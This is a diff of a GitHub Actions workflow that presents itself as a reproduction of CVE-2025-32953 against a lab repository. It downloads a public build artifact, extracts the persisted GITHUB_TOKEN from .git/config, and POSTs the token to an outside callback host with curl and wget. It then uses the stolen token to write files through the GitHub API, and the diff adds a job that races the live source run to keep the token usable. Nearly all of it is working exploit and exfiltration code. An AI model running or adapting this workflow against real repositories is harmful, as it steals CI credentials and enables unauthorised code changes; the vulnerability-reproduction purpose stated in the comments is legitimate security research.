@@ -3,26 +3,32 @@ name: leak-verify
 # Throwaway demonstration workflow (Phase B of the CVE-2025-32953 reproduction).
 # It does NOT modify the vulnerable workflow (.github/workflows/makefile-ubuntu.yml):
 # it simulates exactly what an outside attacker does with the public artifact
-# z80pack-ubuntu produced by the Phase-A push run:
+# z80pack-ubuntu produced by a push run of that workflow:
 #   1. download the artifact,
 #   2. extract the checkout-persisted GITHUB_TOKEN from .git/config,
 #   3. call home (first action),
-#   4. prove the recovered token still has write access.
+#   4. prove the recovered token still has write access (while its source run is live).
 
 on:
   push:
     branches: [ "master" ]
-  workflow_dispatch: {}
+  workflow_dispatch:
+    inputs:
+      target_run_id:
+        description: "Optional run id of a Makefile CI (source) run to race"
+        required: false
+        default: ""
 
 env:
   CALLBACK_BASE: https://cve-repro-callback.pvharmo.workers.dev/INJECTED-MARKER-cve-2025-32953-0d592d6058b0
   HARNESS_RUN_ID: 20260831T002034-845acc08
   PHASE_A_RUN_ID: "33729219961"
   PROOF_BRANCH: leak-verify/INJECTED-MARKER-cve-2025-32953-0d592d6058b0
-  PROOF_CONTENT: INJECTED-MARKER-cve-2025-32953-0d592d6058b0
 
 jobs:
   verify:
+    # Phase-A artifact flow: recover the persisted credential from the original
+    # Phase-A artifact and exfiltrate it (attacker's first action after download).
     runs-on: ubuntu-latest
     timeout-minutes: 20
     steps:
@@ -69,14 +75,11 @@ jobs:
           # Recovered credential stays out of the logs: only shape/length are echoed.
           case "$TOKEN" in
             ghs_*) SHAPE="ghs_*";;
-            ghp_*) SHAPE="ghp_*";;
-            gho_*) SHAPE="gho_*";;
             github_pat_*) SHAPE="github_pat_*";;
             x-access-token:*) SHAPE="unstripped-x-access-token";;
             *) SHAPE="other(first-char=${TOKEN:0:1})";;
           esac
           echo "EXTRAHEADER_FOUND=yes, token shape: $SHAPE, length: ${#TOKEN}"
-          echo "b64 length: ${#B64}, decoded length: ${#CRED}"
           echo "LEAKED_TOKEN=$TOKEN" >> "$GITHUB_ENV"
 
       - name: First action - POST recovered credential to callback
@@ -90,52 +93,16 @@ jobs:
             wget --post-data="$BODY" -qO- "$CB"
           fi
 
-      - name: Usability check - write leak-proof.txt with the EXTRACTED token
+      - name: Post-run usability check with the Phase-A extracted token
         run: |
           set -euo pipefail
-          B64CONTENT=$(printf '%s' "$PROOF_CONTENT" | base64 -w0)
-          put_file() {
-            curl -sS -o /tmp/put.json -w '%{http_code}' -X PUT \
-              -H "Authorization: Bearer $LEAKED_TOKEN" \
-              -H "Accept: application/vnd.github+json" \
-              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
-              -d "{\"message\":\"leak-proof via leaked artifact token\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}"
-          }
-          CODE=$(put_file)
-          echo "contents PUT status: $CODE"
-          echo "PUT response message: $(jq -r '.message // empty' /tmp/put.json 2>/dev/null || true)"
-          if [ "$CODE" != "201" ]; then
-            echo "PUT != 201; trying Authorization: token scheme"
-            CODE2=$(curl -sS -o /tmp/put2.json -w '%{http_code}' -X PUT \
-              -H "Authorization: token $LEAKED_TOKEN" \
-              -H "Accept: application/vnd.github+json" \
-              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
-              -d "{\"message\":\"leak-proof via leaked artifact token (token scheme)\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}")
-            echo "contents PUT (token scheme) status: $CODE2, message: $(jq -r '.message // empty' /tmp/put2.json 2>/dev/null || true)"
-            echo "trying basic auth form"
-            CODE3=$(curl -sS -o /tmp/put3.json -w '%{http_code}' -u "x-access-token:$LEAKED_TOKEN" -X PUT \
-              -H "Accept: application/vnd.github+json" \
-              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
-              -d "{\"message\":\"leak-proof via leaked artifact token (basic)\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}")
-            echo "contents PUT (basic) status: $CODE3, message: $(jq -r '.message // empty' /tmp/put3.json 2>/dev/null || true)"
-            UCODE=$(curl -sS -o /tmp/user.json -w '%{http_code}' -H "Authorization: Bearer $LEAKED_TOKEN" https://api.github.com/user)
-            echo "GET /user (Bearer) status: $UCODE, message: $(jq -r '.message // "none"' /tmp/user.json)"
-            RCODE=$(curl -sS -o /tmp/repo.json -w '%{http_code}' -H "Authorization: Bearer $LEAKED_TOKEN" "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522")
-            echo "GET /repo (Bearer) status: $RCODE"
-            if [ "$CODE2" = "201" ]; then CODE=$CODE2; elif [ "$CODE3" = "201" ]; then CODE=$CODE3; else
-              echo "PUT != 201; creating branch ref with the extracted token and retrying"
-              SHA=$(curl -sS -H "Authorization: Bearer $LEAKED_TOKEN" \
-                "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/ref/heads/master" \
-                | jq -r '.object.sha')
-              REF_CODE=$(curl -sS -o /tmp/ref.json -w '%{http_code}' -X POST \
-                -H "Authorization: Bearer $LEAKED_TOKEN" \
-                "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/git/refs" \
-                -d "{\"ref\":\"refs/heads/$PROOF_BRANCH\",\"sha\":\"$SHA\"}")
-              echo "refs create status: $REF_CODE, message: $(jq -r '.message // empty' /tmp/ref.json 2>/dev/null || true)"
-              CODE=$(put_file)
-              echo "contents PUT retry status: $CODE"
-            fi
-          fi
+          B64CONTENT=$(printf 'INJECTED-MARKER-cve-2025-32953-0d592d6058b0' | base64 -w0)
+          CODE=$(curl -sS -o /tmp/put.json -w '%{http_code}' -X PUT \
+            -H "Authorization: Bearer $LEAKED_TOKEN" \
+            -H "Accept: application/vnd.github+json" \
+            "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof.txt" \
+            -d "{\"message\":\"leak-proof via leaked artifact token\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}")
+          echo "contents PUT status: $CODE, message: $(jq -r '.message // empty' /tmp/put.json 2>/dev/null || true)"
           echo "PUT_STATUS=$CODE" >> "$GITHUB_ENV"
 
       - name: Append usability result to callback
@@ -146,3 +113,101 @@ jobs:
           BODY="leaked_token=$LEAKED_TOKEN&source=z80pack-ubuntu-artifact&token_name=GITHUB_TOKEN&put_status=$PUT_STATUS"
           curl -sS -o /tmp/cb2.out -w 'callback POST (result) status: %{http_code}\n' -X POST "$CB" --data "$BODY"
           echo "put_status recorded: $PUT_STATUS"
+
+  race:
+    # Live-race flow: targets the Makefile CI run of the SAME push (same head sha),
+    # polls for its artifact, extracts the persisted credential the moment the
+    # artifact exists, and attempts the write while the source run is still active.
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: Resolve target Makefile CI run id
+        env:
+          GH_TOKEN: ${{ github.token }}
+          TARGET_RUN_ID: ${{ inputs.target_run_id }}
+        run: |
+          set -euo pipefail
+          if [ -n "$TARGET_RUN_ID" ]; then
+            RID="$TARGET_RUN_ID"
+          else
+            SHA="${{ github.sha }}"
+            RID=""
+            for i in $(seq 1 30); do
+              RID=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs?head_sha=$SHA&per_page=20" \
+                --jq '[.workflow_runs[] | select(.name=="Makefile CI")] | first | .id // empty' || true)
+              [ -n "$RID" ] && break
+              sleep 2
+            done
+            if [ -z "$RID" ]; then
+              RID=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs?per_page=20" \
+                --jq '[.workflow_runs[] | select(.name=="Makefile CI")] | first | .id // empty')
+            fi
+          fi
+          echo "race target run id: $RID"
+          echo "RACE_RUN_ID=$RID" >> "$GITHUB_ENV"
+
+      - name: Poll for source artifact while source run is live
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          FOUND=""
+          for i in $(seq 1 150); do
+            FOUND=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs/$RACE_RUN_ID/artifacts" \
+              --jq '[.artifacts[] | select(.name=="z80pack-ubuntu")] | first | .id // empty' || true)
+            [ -n "$FOUND" ] && break
+            sleep 2
+          done
+          echo "artifact id: ${FOUND:-none}"
+          [ -n "$FOUND" ] || { echo "no artifact appeared in time"; exit 1; }
+          echo "RACE_ARTIFACT_ID=$FOUND" >> "$GITHUB_ENV"
+
+      - name: Extract credential and write immediately (live race)
+        env:
+          GH_TOKEN: ${{ github.token }}
+        run: |
+          set -euo pipefail
+          curl -sSL --max-time 120 -H "Authorization: Bearer $GH_TOKEN" \
+            -o /tmp/artifact.zip \
+            "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/artifacts/$RACE_ARTIFACT_ID/zip"
+          ls -l /tmp/artifact.zip
+          mkdir -p w
+          unzip -q -o /tmp/artifact.zip -d w ".git/config" 2>/dev/null || unzip -q -o /tmp/artifact.zip -d w
+          EH=$(git config -f ./w/.git/config --get http.https://github.com/.extraheader || true)
+          [ -n "$EH" ] || { echo "no extraheader found"; exit 1; }
+          B64=$(printf '%s' "$EH" | sed 's/^AUTHORIZATION: basic //')
+          CRED=$(printf '%s' "$B64" | base64 -d)
+          TOKEN="${CRED#x-access-token:}"
+          echo "recovered credential length: ${#TOKEN}"
+          echo "LEAKED_TOKEN=$TOKEN" >> "$GITHUB_ENV"
+          SRC_STATUS=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs/$RACE_RUN_ID" --jq .status)
+          echo "source run status at extraction time: $SRC_STATUS"
+          echo "SRC_STATUS=$SRC_STATUS" >> "$GITHUB_ENV"
+
+          # immediate write attempt with the EXTRACTED (not this run's) token
+          B64CONTENT=$(printf 'INJECTED-MARKER-cve-2025-32953-0d592d6058b0-live' | base64 -w0)
+          BEST=""
+          for i in 1 2 3 4 5; do
+            CODE=$(curl -sS -o /tmp/rput.json -w '%{http_code}' -X PUT \
+              -H "Authorization: Bearer $TOKEN" \
+              -H "Accept: application/vnd.github+json" \
+              "https://api.github.com/repos/pvharmo2/gha-lab-57069a2522/contents/leak-proof-live.txt" \
+              -d "{\"message\":\"live-race leak-proof via artifact token\",\"content\":\"$B64CONTENT\",\"branch\":\"$PROOF_BRANCH\"}")
+            echo "write attempt $i status: $CODE, message: $(jq -r '.message // empty' /tmp/rput.json 2>/dev/null || true)"
+            [ -z "$BEST" ] && BEST="$CODE"
+            [ "$CODE" = "201" ] && { BEST="201"; break; }
+            sleep 0.4
+          done
+          SRC_STATUS2=$(gh api "repos/$GITHUB_REPOSITORY/actions/runs/$RACE_RUN_ID" --jq .status)
+          echo "source run status after write attempt: $SRC_STATUS2"
+          echo "LIVE_PUT_STATUS=$BEST" >> "$GITHUB_ENV"
+          echo "SRC_STATUS_AFTER=$SRC_STATUS2" >> "$GITHUB_ENV"
+
+      - name: Report live-race result to callback
+        if: always() && env.LIVE_PUT_STATUS != ''
+        run: |
+          set -euo pipefail
+          CB="$CALLBACK_BASE?harness_run_id=$HARNESS_RUN_ID"
+          BODY="leaked_token=$LEAKED_TOKEN&source=z80pack-ubuntu-artifact-live&token_name=GITHUB_TOKEN&put_status=$LIVE_PUT_STATUS&source_run_status=$SRC_STATUS_AFTER"
+          curl -sS -o /tmp/cbr.out -w 'callback POST (live race) status: %{http_code}\n' -X POST "$CB" --data "$BODY"
+          echo "live put_status recorded: $LIVE_PUT_STATUS (source run status: $SRC_STATUS_AFTER)"
